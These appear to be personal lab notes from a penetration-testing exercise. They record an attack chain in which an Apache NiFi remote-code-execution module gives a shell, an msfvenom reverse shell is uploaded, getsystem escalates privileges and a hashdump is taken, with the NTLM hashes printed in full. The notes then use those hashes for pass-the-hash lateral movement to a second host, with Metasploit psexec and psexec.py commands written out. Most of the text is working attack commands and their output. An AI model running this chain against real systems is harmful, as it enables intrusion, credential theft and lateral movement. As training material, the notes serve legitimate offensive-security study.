
# apache nifi
- vm1 - web server

1. `multi/http/apache_nifi_processor_rce`
this drops into a CMD shell as user `alex` 
2. upload a meterpreter reverse shell payload - built using msfvenom to the machine to get a meterpreter shell
3. `getsystem` to evelate to `system` account as `SeImpersonatePrivilege` is set for `alex` user
4. `hashdump`
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b26462f877427f4f6a87605d587ac60d:::
alex:1002:aad3b435b51404eeaad3b435b51404ee:5391f1724568f48a4aadba748109864c:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
itwk04admin:1003:aad3b435b51404eeaad3b435b51404ee:445414c16b5689513d4ad8234391aacf:::
offsec:1001:aad3b435b51404eeaad3b435b51404ee:b26462f877427f4f6a87605d587ac60d:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2cb4d723f9fce9b26d61be15e5ad1c51:::
```
5. find out which users have access to the other server smb with the same password
```msfconsole
use scanner/smb/smb_enumusers
set smbuser itwk04admin
set smbpass aad3b435b51404eeaad3b435b51404ee:445414c16b5689513d4ad8234391aacf
run

[+] 192.168.219.226:445   - ITWK04 [ DefaultAccount, Guest, itwk04admin, offsec, WDAGUtilityAccount ] ( LockoutTries=0 PasswordMin=0 )
[*] 192.168.219.226:      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
6. Use user `itwk04admin` to smb enumerate users on the other machine:
# smb
- vm2
#metasploit #smb #psexec
The following payload worked, but all others I tried failed:
`windows/shell/bind_tcp`

## Exploit
```msfconsole
use windows/smb/psexec
set rhosts 192.168.219.226
set SMBUser itwk04admin
set SMBPass aad3b435b51404eeaad3b435b51404ee:445414c16b5689513d4ad8234391aacf
set AutoRunScript post/windows/manage/migrate
set payload windows/shell/bind_tcp
run
```


## alternative approach
#psexec_py #psexec
This worked!!!
```sh
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:445414c16b5689513d4ad8234391aacf itwk04admin@192.168.219.226
```